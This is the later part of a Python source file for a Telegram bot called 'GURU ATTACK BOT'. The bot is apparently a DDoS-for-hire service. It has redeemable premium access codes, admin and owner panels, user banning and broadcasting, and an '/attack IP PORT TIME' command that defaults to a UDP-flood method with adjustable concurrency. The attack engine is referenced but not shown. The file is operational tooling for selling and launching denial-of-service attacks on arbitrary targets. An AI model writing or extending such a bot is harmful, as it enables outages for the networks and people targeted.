        [InlineKeyboardButton("📅 1 DAY", callback_data="gen_1d")],
        [InlineKeyboardButton("📅 3 DAYS", callback_data="gen_3d")],
        [InlineKeyboardButton("📅 7 DAYS", callback_data="gen_7d")],
        [InlineKeyboardButton("📅 30 DAYS", callback_data="gen_30d")],
        [InlineKeyboardButton("📅 LIFETIME", callback_data="gen_lifetime")],
        [InlineKeyboardButton("🔙 BACK", callback_data="admin")]
    ]
    
    await query.edit_message_text(
        "➕ *GENERATE CODE*\n\nSelect duration:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def process_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data.split('_')[1]
    days = 3650 if data == "lifetime" else int(data.replace('d', ''))
    
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    
    if db.create_code(code, days, query.from_user.id):
        duration_text = "LIFETIME" if days >= 3650 else f"{days} days"
        await query.edit_message_text(
            f"✅ *CODE GENERATED*\n\nCode: `{code}`\nDuration: {duration_text}",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
        )
    else:
        await query.edit_message_text("❌ Failed to generate code!")

async def admin_list_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    codes = db.get_codes()
    if not codes:
        text = "📋 No codes generated yet."
    else:
        text = "📋 *CODES*\n\n"
        for c in codes[:10]:
            status = "✅" if not c.get('is_used') else "❌ Used"
            duration_text = "LIFETIME" if c['access_days'] >= 3650 else f"{c['access_days']}d"
            text += f"`{c['code']}` - {duration_text} - {status}\n"
    
    await query.edit_message_text(
        text[:4000],
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
    )

async def admin_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "📢 *BROADCAST*\n\nSend the message to broadcast.\nSend /cancel to cancel.",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_broadcast'] = True

async def process_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_broadcast'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_broadcast'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    users = db.get_all_users()
    if not users:
        await update.message.reply_text("❌ No users found!")
        context.user_data['awaiting_broadcast'] = False
        return
    
    progress_msg = await update.message.reply_text(f"📢 Broadcasting to {len(users)} users...")
    
    successful = 0
    for i, user in enumerate(users):
        try:
            await context.bot.send_message(
                chat_id=user['user_id'],
                text=update.message.text,
                parse_mode='Markdown'
            )
            successful += 1
        except:
            pass
        await asyncio.sleep(0.05)
    
    await progress_msg.edit_text(f"✅ Broadcast complete!\n✅ Successful: {successful}\n❌ Failed: {len(users) - successful}")
    context.user_data['awaiting_broadcast'] = False

async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_owner_or_pseudo(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    pause_info = db.get_pause_info()
    pause_status = pause_info.get('paused', False)
    
    keyboard = [
        [InlineKeyboardButton("⚡ SET CONCURRENT", callback_data="owner_concurrent")],
        [InlineKeyboardButton("👑 PROMOTE ADMIN", callback_data="owner_promote")],
        [InlineKeyboardButton("👑 DEMOTE ADMIN", callback_data="owner_demote")],
        [InlineKeyboardButton("🚫 BAN USER", callback_data="owner_ban")],
        [InlineKeyboardButton("✅ UNBAN USER", callback_data="owner_unban")],
        [InlineKeyboardButton("📋 LIST ADMINS", callback_data="owner_list_admins")],
        [InlineKeyboardButton("📋 LIST USERS", callback_data="owner_list_users")],
        [InlineKeyboardButton("⏸️ PAUSE" if not pause_status else "▶️ RESUME", callback_data="owner_pause")],
        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="owner_stop")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "👑 *OWNER PANEL*\n\n"
        f"Status: {'⏸️ PAUSED' if pause_status else '🟢 ACTIVE'}\n"
        f"🔄 Concurrent: **{DEFAULT_CONCURRENT}**",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def owner_concurrent_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        f"⚡ *SET CONCURRENT*\n\n"
        f"Current: **{DEFAULT_CONCURRENT}**\n"
        f"Min: {MIN_CONCURRENT}\n"
        f"Max: {MAX_CONCURRENT}\n\n"
        f"Send: `/setconcurrent NUMBER`",
        parse_mode='Markdown'
    )

async def owner_stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_owner_or_pseudo(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    success, msg = await attack_manager.stop_attack(user_id)
    await query.edit_message_text(f"{'✅' if success else '❌'} {msg}")

async def owner_pause_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_owner_or_pseudo(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    current_pause = db.get_pause_info().get('paused', False)
    db.set_pause(not current_pause, user_id)
    
    await query.edit_message_text(
        f"{'⏸️ Bot Paused' if not current_pause else '✅ Bot Resumed'}",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
    )

async def owner_promote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "👑 PROMOTE ADMIN\n\nSend: USER_ID\nSend /cancel to cancel"
    )
    context.user_data['awaiting_promote'] = True

async def process_promote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_promote'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_promote'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        user = db.get_user(user_id)
        if not user:
            await update.message.reply_text(f"❌ User {user_id} not found!")
            return
        
        if db.is_admin(user_id):
            await update.message.reply_text(f"❌ User {user_id} is already an admin!")
            return
        
        db.add_admin(user_id, user.get('username', 'Unknown'), "admin", update.effective_user.id)
        await update.message.reply_text(f"✅ User {user_id} promoted to ADMIN!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_promote'] = False

async def owner_demote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    admins = db.get_admins()
    keyboard = []
    for admin in admins:
        admin_id = admin['user_id']
        if admin_id != OWNER_ID:
            keyboard.append([InlineKeyboardButton(f"❌ {admin_id}", callback_data=f"demote_{admin_id}")])
    
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="owner")])
    
    await query.edit_message_text(
        "👑 DEMOTE ADMIN\n\nClick an admin to demote:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def process_demote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = int(query.data.split('_')[1])
    if user_id == OWNER_ID:
        await query.edit_message_text("❌ Cannot demote the owner!")
        return
    
    if db.remove_admin(user_id):
        await query.edit_message_text(
            f"✅ Admin {user_id} demoted!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
        )
    else:
        await query.edit_message_text("❌ Failed to demote!")

async def owner_ban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "🚫 BAN USER\n\nSend user ID to ban:\nSend /cancel to cancel"
    )
    context.user_data['awaiting_ban'] = True

async def process_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_ban'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_ban'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        if user_id == OWNER_ID:
            await update.message.reply_text("❌ Cannot ban the owner!")
            context.user_data['awaiting_ban'] = False
            return
        
        if db.is_admin(user_id):
            await update.message.reply_text("❌ Cannot ban an admin!")
            context.user_data['awaiting_ban'] = False
            return
        
        db.ban_user(user_id, "Banned by owner", update.effective_user.id)
        await update.message.reply_text(f"✅ User {user_id} banned!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_ban'] = False

async def owner_unban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "✅ UNBAN USER\n\nSend user ID to unban:\nSend /cancel to cancel"
    )
    context.user_data['awaiting_unban'] = True

async def process_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_unban'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_unban'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        db.unban_user(user_id)
        await update.message.reply_text(f"✅ User {user_id} unbanned!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_unban'] = False

async def owner_list_admins_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    admins = db.get_admins()
    if not admins:
        await query.edit_message_text("👑 No admins found.")
        return
    
    text = "👑 *ADMINS*\n\n"
    for admin in admins:
        level = admin.get('level', 'admin').upper()
        text += f"• {admin['user_id']} - {level}\n"
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
    )

async def owner_list_users_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    users = db.get_all_users()
    if not users:
        await query.edit_message_text("📋 No users found.")
        return
    
    text = "👥 *USERS*\n\n"
    for user in users[:20]:
        user_id = user.get('user_id')
        username = user.get('username', 'N/A')
        plan = user.get('plan', 'free').upper()
        is_banned = "🚫" if user.get('is_banned') else "✅"
        text += f"{is_banned} {user_id} - @{username} ({plan})\n"
    
    if len(users) > 20:
        text += f"\n... and {len(users) - 20} more"
    
    await query.edit_message_text(
        text[:4000],
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
    )

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    user_id = user.id
    is_admin = db.is_admin(user_id)
    is_owner = db.is_owner_or_pseudo(user_id)
    
    keyboard = []
    if not db.is_banned(user_id):
        keyboard.append([InlineKeyboardButton("💥 ATTACK", callback_data="attack")])
        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
    
    if is_admin:
        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    if is_owner:
        keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])
    
    await query.edit_message_text(
        "👋 *WELCOME BACK*",
        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

async def message_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('awaiting_attack'):
        await process_attack_message(update, context)
    elif context.user_data.get('awaiting_promote'):
        await process_promote(update, context)
    elif context.user_data.get('awaiting_ban'):
        await process_ban(update, context)
    elif context.user_data.get('awaiting_unban'):
        await process_unban(update, context)
    elif context.user_data.get('awaiting_broadcast'):
        await process_broadcast(update, context)

async def process_attack_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    await attack_command(update, context)
    context.user_data['awaiting_attack'] = False

# ===== BOT RUNNER =====
async def run_bot():
    """Run the Telegram bot"""
    try:
        app_bot = Application.builder().token(TELEGRAM_TOKEN).build()
        
        # Add handlers
        app_bot.add_handler(CommandHandler("start", start))
        app_bot.add_handler(CommandHandler("attack", attack_command))
        app_bot.add_handler(CommandHandler("stop", stop_command))
        app_bot.add_handler(CommandHandler("setconcurrent", set_concurrent_command))
        app_bot.add_handler(CommandHandler("testapi", testapi_command))
        app_bot.add_handler(CommandHandler("status", status_command))
        app_bot.add_handler(CommandHandler("redeem", redeem_command))
        app_bot.add_handler(CommandHandler("cancel", cancel))
        
        # Callback handlers
        app_bot.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
        app_bot.add_handler(CallbackQueryHandler(method_callback, pattern="^method_"))
        app_bot.add_handler(CallbackQueryHandler(my_plan_callback, pattern="^my_plan$"))
        app_bot.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
        app_bot.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
        app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
        app_bot.add_handler(CallbackQueryHandler(admin_gen_callback, pattern="^admin_gen$"))
        app_bot.add_handler(CallbackQueryHandler(process_gen_callback, pattern="^gen_"))
        app_bot.add_handler(CallbackQueryHandler(admin_list_callback, pattern="^admin_list$"))
        app_bot.add_handler(CallbackQueryHandler(admin_broadcast_callback, pattern="^admin_broadcast$"))
        app_bot.add_handler(CallbackQueryHandler(owner_callback, pattern="^owner$"))
        app_bot.add_handler(CallbackQueryHandler(owner_concurrent_callback, pattern="^owner_concurrent$"))
        app_bot.add_handler(CallbackQueryHandler(owner_pause_callback, pattern="^owner_pause$"))
        app_bot.add_handler(CallbackQueryHandler(owner_promote_callback, pattern="^owner_promote$"))
        app_bot.add_handler(CallbackQueryHandler(owner_demote_callback, pattern="^owner_demote$"))
        app_bot.add_handler(CallbackQueryHandler(owner_ban_callback, pattern="^owner_ban$"))
        app_bot.add_handler(CallbackQueryHandler(owner_unban_callback, pattern="^owner_unban$"))
        app_bot.add_handler(CallbackQueryHandler(owner_list_admins_callback, pattern="^owner_list_admins$"))
        app_bot.add_handler(CallbackQueryHandler(owner_list_users_callback, pattern="^owner_list_users$"))
        app_bot.add_handler(CallbackQueryHandler(owner_stop_callback, pattern="^owner_stop$"))
        app_bot.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))
        
        app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))
        
        # Start bot
        await app_bot.initialize()
        await app_bot.start()
        await app_bot.updater.start_polling()
        
        logger.info(f"✅ Bot started! @{app_bot.bot.username}")
        logger.info(f"📡 Owner ID: {OWNER_ID}")
        
        # Keep running
        while True:
            await asyncio.sleep(1)
            
    except Exception as e:
        logger.error(f"❌ Bot error: {e}")
        raise

# ===== MAIN =====
async def main():
    """Main entry point"""
    # Start bot
    bot_task = asyncio.create_task(run_bot())
    
    # Wait for bot to initialize
    await asyncio.sleep(3)
    
    # Start Quart web server
    try:
        await app.run_task(host='0.0.0.0', port=PORT)
    except Exception as e:
        logger.error(f"❌ Web server error: {e}")
        bot_task.cancel()

if __name__ == "__main__":
    print("=" * 60)
    print("🔥 GURU ATTACK BOT")
    print(f"⚡ DEFAULT CONCURRENT: {DEFAULT_CONCURRENT}")
    print(f"📡 DEFAULT METHOD: UDP-FLOOD")
    print(f"⏱️ DURATION: {MIN_DURATION}-{MAX_DURATION}s")
    print("=" * 60)
    print("💡 Commands:")
    print("  /start - Start the bot")
    print("  /attack IP PORT TIME - Start attack")
    print("  /status - Show status")
    print("  /redeem CODE - Redeem premium")
    print("=" * 60)
    print("🚀 Starting bot...")
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Shutting down...")
    except Exception as e:
        print(f"❌ Error: {e}")